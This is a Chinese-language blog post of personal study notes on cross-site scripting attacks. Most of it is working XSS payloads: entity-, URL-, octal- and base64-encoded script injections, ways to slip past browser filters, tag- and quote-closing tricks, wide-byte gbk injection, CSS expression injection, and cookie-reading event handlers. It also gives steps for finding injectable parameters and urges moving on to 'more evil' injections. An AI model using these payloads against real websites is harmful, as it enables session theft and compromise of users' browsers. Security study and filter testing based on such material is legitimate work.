---
layout: post
title: xss零碎指南
description: 该文章是本人两天的学习笔记，共享出来，跟大家交流。知识比较零散，但是对有一定 JS 基础的人来说，每个小知识都有助于开阔你的 Hack 视角。首先声明，本文只是 XSS 攻击的冰山一角，读者自行深入研究。
category: blog
tags: xss
---

该文章是本人两天的学习笔记，共享出来，跟大家交流。知识比较零散，但是对有一定 JS 基础的人来说，每个小知识都有助于开阔你的 Hack 视角。首先声明，本文只是 XSS 攻击的冰山一角，读者自行深入研究。

## 一、XSS学习提要

1. <http://qdemo.sinaapp.com/ppt/xss/> 三水清
   简单介绍 xss
2. <http://drops.wooyun.org/tips/689>  乌云
   xss与字符编码
3. <http://www.wooyun.org/whitehats/心伤的瘦子>
   系列教程
4. <http://ha.ckers.org/xss.html>
   反射性XSS详细分析和解释
5. <http://html5sec.org/>
   各种技巧 ★★★★★
6. <http://www.80sec.com/>
   一些不错的文章


## 二、XSS攻击要点

注意：这些插入和修改都是为了避开浏览器自身的过滤，或者开发者认为的过滤。

**1. document.write innerHTML eval setTimeout/setInterval等等都是很多XSS攻击注入的入口。**
    
**2. html实体编码**

    > "alert("Barret李靖")".replace(/./g, function(s){
         return "&#" + s.charCodeAt(0)
          /*.toString(16) 转换成16进制也可以滴*/
          + ";"
      });
    
    > "&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;"
    
    <img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;" />
    
**3. 如果过滤 html 实体编码，可以改成URL编码**

    > encodeURIComponent("&#")
    > "%26%23"
    
**4. 利用 HTML5 新增字符**
    
    &colon; 冒号
    &NewLine; 换行
    
    <a href="javascr&NewLine;ipt&colon;alert("Barret李靖")">XSS</a>
    
**5. JS进制转换**
    
    > "\74\163\143\162\151\160\164\76\141\154\145\162\164\50\61\51\74\57\163\143\162\151\160\164\76"
    > "<script>alert("Barret李靖")</script>"
    
**6. Base64转换**

    > base64("<script>alert("Barret李靖")</script>");
    > PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
    
    <a href="data:text/html;base64, PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">XSS</a>
    
**7. 浏览器解析非严格性**

    <img src=image.jpg title="Hello World" class=test>
      ↓ ↓    ↓        ↓      ↓            ↓
      ① ②    ③        ④      ⑤            ⑥
      
①中可插入 NUL字符（0x00）
②和④中空格可以使用 tab（0x0B）与换页键（0x0C），②还可以使用 / 替换
⑤中的"在IE中也可替换成`。


       位置     |        代码            | 可能插入或替代的代码
    ------------|--------------------------|-----------------------
    <的右边     | <[here]a href="...      | 控制符，空白符，非打印字符
    a标签的后门 | <a[here]href="...        | 同上
    href属性中间| <a hr[here]ef="...       | 同上+空字节
    =两边       | <a href[here]=[here]"... | 所有字符
    替换=       | <a href[here]"...        | Union编码符号
    替换"       | <a href=[here]…[here]>   | 其他引号
    >之前       | <a href="…"[here]>       | 任意字符
    /之前       | <a href="…">...<[here]/a>| 空白符，控制符
    /之后       | <a href="…">...</[here]a>| 空白符，控制符
    >闭合之前   | <a href="…">…</a[here]>  | 所有字符



**8. 斜杠**

在字符串中斜杠（/）可以用于转义字符，比如转义 " 和 ' ，双斜杠（//）可以用来注释。这样可以很轻松的改变之前的语句，注入内容。

**9. 空格的处理方式**

在解析的时候空格被转移成 `&nbsp;`,注入的时候可以使用 `/**/`来替换。

**10. 特殊属性**

1）srcdoc属性（chrome有效）

    <iframe srcdoc="&lt;script&gt;alert("Barret李靖")&lt;/script&gt;"></iframe>

2）autofoucus

    <input onfocus=write(1) autofocus>

3）object

    <object classid="clsid:333c7bc4-460f-11d0-bc04-0080c7055a83">
        <param name="dataurl" value="javascript:alert("Barret李靖")">
    </object>

**11.绕过浏览器过滤（crhome）**

    ?t="><img src=1 onerror=alert("Barret李靖")>
    <input type="hidden" id="sClientUin" value="{{t}}">

    浏览器会过滤onerror中的代码，所以换种方式注入

    ?t="><script src="data:text/html,<script>alert("Barret李靖")</script><!--

chrome拦截，是有一定的拦截规则的，只有它觉得是恶意代码的才会去拦截。

**12.替换URL**
    
    <xss style="behavior: url(xss.htc);">
    <style>.xss{background-image:url("javascript:alert('xss')");}</style><a class=xss></a>
    <style type="text/css">body{background:url("javascript:alert('xss')")}</style>

**13.抓包、换包*


## 三、XSS攻击方式

**1. javascript:和vbscript:协议执行后的结果将会映射在DOM**后面。

    <a href="javascript:'\x3cimg src\x3dx onerror=alert("Barret李靖")>'">click me</a>

**2. 变量覆盖**

    <form id="location" href="bar">
    <script>alert(location.href)</script>
    
**3. meta标签**

    <meta http-equiv="refresh" content="0; url=javascript:alert(document.domain)">
    Javascript: 协议可能被禁止，可以使用 data:
    <meta http-equiv="refresh" content="0; url=data:text/html,<script>alert("Barret李靖")</script>">

**4. css注入**

    <style>
    @import "data:,*%7bx:expression(write(1))%7D";
    </style>
    <style>
    @imp\ ort"data:,*%7b- = \a %65x\pr\65 ssion(write(2))%7d"; </style>
    <style>
    <link rel="Stylesheet" href="data:,*%7bx:expression(write(3))%7d">

**5. 提前闭合标签**

    http://example.com/test.php?callback=cb

    缺陷代码：
    <script type='text/javascript'>
        document.domain='soso.com';
        _ret={"_res":2};
        try{
            parent.aaa(_ret);
        }catch(err){
            aaa(_ret);
        }
    </script>

    注入：http://example.com/test.php?callback=cb</script><script>alert("XSS")</script>

原理：
cb为回调函数，如果后端并没有对callback字段进行过滤，则可以`cb</script><script>alert("XSS")</script>`这么长的一串作为函数名，然后你就懂啦~ 本方式只针对上面有缺陷的代码。

**6. 提前闭合双引号**

    <input type="text" value="XSS&quot; onclick=&quot;alert("Barret李靖")" />

    <!--<img src="--><img src=x onerror=alert("Barret李靖")//">
    <comment><img src="</comment><img src=x onerror=alert("Barret李靖")//">
    <![><img src="]><img src=x onerror=alert("Barret李靖")//">
    <style><img src="</style><img src=x onerror=alert("Barret李靖")//">

**7. 阻止编码**

    ?t=;alert("Barret李靖")
    <script type="text/javascript">
        var t = query(t); // t = "&quot;;alert("Barret李靖")"
    </script>

上面可以看到 ";" 被编码了，观察页面编码：
    
    <meta http-equiv="Content-Type" content="text/html; charset=gb18030" />

gbxxx系列编码，可以尝试宽字节：

    ?t=%c0%22alert("Barret李靖")

**8. 攻击单行注释**

URL对应的param中添加换行符（%0a）或者其他换行符。

    ?t=%0aalert("Barret李靖")//

    // init('id', "%0aalert("Barret李靖")//");

    被解析成

    // init('id', "
    alert("Barret李靖")//");

**9. url**

url中可以使用很多协议 http:// https:// javascript: vbscript: data:等等，利用这些属性，可以找到很多的空隙。

    <a href="data:text/html,<script>alert("Barret李靖")</script>">XSS</a>

**10. Flash跨域注入**

这个我不太熟悉，现在网页上Flash用的越来越少了，懒得继续看了。

**11. 利用事件**
    
    <iframe src=# onmouseover="alert(document.cookie)"></iframe>

**12. 利用标签**
    
    <table><td background="javascript:alert('xss')">



## 四、XSS攻击实质

XSS攻击没太多神奇的地方，就是利用浏览器防御不周到或者开发者代码不健壮，悄悄对页面或者服务器进行攻击。

**1. 绕过过滤**

URL中的 `<`，在DOM XSS中，可以使用 \u003c (unicode编码)表示，不过他有可能被过滤了，最后解析成`&lt;`，也可以使用 \x3c (Javascript 16进制编码)，`>` 对应使用 \x3e。这种情况经常在 innerHTML 以及 document.write 中用到。

所谓的过滤包括人工过滤，也包括了浏览器HTML与JavaScript本身的过滤，程序员会在浏览器本身过滤过程中进行一些干扰和修改，这几个流程都给我们提供了很多 xss 攻击的入口。

1) 数据需要过滤，但是未过滤。导致XSS。比如：昵称、个人资料。
2) 业务需求使得数据只能部分过滤，但过滤规则不完善，被绕过后导致XSS。比如：日志、邮件及其它富文本应用。


**2. 利用源码中js的解析**

比如第二部分提出的第11点，浏览器的拦截

    
    ?t="><script>alert("Barret李靖")</script>

这样的插入会被拦截，当你发现源码中有这么一句话的时候：

    function parseURL(){
        //...
        t.replace("WOW", "");
        //..
    }

便可以修改如上参数：

    ?t="><scrWOWipt>alert("Barret李靖")</scrWOWipt>

直接绕过了chrome浏览器对危险代码的防御。


## 五、学会XSS攻击

**1. 寻找可控参数**

攻击入口在哪里？一般是有输入的地方，比如URL、表单、交互等。

- 含参数的URL中找到参数 value 值的输出点，他可能在html中输入，也可能是在javascript中
- 实验各种字符（< , > " '等），判断是否被过滤，测试方式，手动输入测试
- 确定可控范围，是否可以使用unicode编码绕过，是否可以使用HTML编码绕过，是否可以使用Javascript进制编码绕过等等

**2. 开始注入**

注入细节上面都是，基本的思维模式：

- 覆盖
- 阻断
- 利用特性

**3. 修补注入错误**

注入后保证没有语法错误，否则代码不会执行，注入了也没用。这里的意思是，你注入的一个参数可能在脚本多处出现，你可以保证一处没语法错误，但是不能保证处处都正确

**4. 开搞**
测试的时候alert("Barret李靖"),弹出成功再继续其他更邪恶的注入方式。


## 六、XSS分类

为什么留到后面说。XSS也了解了很多次了，每次都是先从概念触发，感觉没啥意思，什么反射性、DOM型、储存型等等，还不如先去实践下，凭着自己对XSS的理解，多看几个网站的源码，找找乐趣。

存储型和反射型相比，只是多了输入存储、输出取出的过程。简单点说：

反射型是：输入--输出；<br />
存储型是：输入--进入数据库*--取出数据库--输出。

这样一来，大家应该注意到以下差别：

反射型是：绝大部分情况下，输入在哪里，输出就在哪里。<br />
存储型是：输入在A处进入数据库， <br />而输出则可能出现在其它任何用到数据的地方。

反射型是：输入大部分位于地址栏或来自DOM的某些属性，也会偶尔有数据在请求中（POST类型）
存储型是：输入大部分来自POST/<br />GET请求，常见于一些保存操作中。

因而我们找存储型的时候，从一个地方输入数据，需要检测很多输出的点，从而可能会在很多点发现存储型XSS。


## 七、辅助工具

1. http://ha.ckers.org/xsscalc.html
2. chrome插件 （xss Encode，百度之）
3. 抓包工具，[fiddler4](http://www.telerik.com/download/fiddler)  [chales](http://www.charlesproxy.com/latest-release/download.do)
4. 白名单过滤工具[github/js-xss](https://github.com/leizongmin/js-xss)

## 八、小结

简单小结：

- & 号不应该出现在HTML的大部分节点中。
- 括号<>是不应该出现在标签内的，除非为引号引用。
- 在ext节点里面，<左尖括号有很大的危害。
- 引号在标签内可能有危害，具体危害取决于存在的位置，但是在text节点是没有危害的。
- 。。。

关注漏洞报告平台 Wooyun，多动脑筋，手动 hack。最重要的还是先黑客再红客。

## 九、参考资料

- <http://drops.wooyun.org/tips/689>
- <http://drops.wooyun.org/tips/147>
- <http://www.web-tinker.com/article/20468.html>
- <http://www.wooyun.org/whitehats/心伤的瘦子>
- <https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet>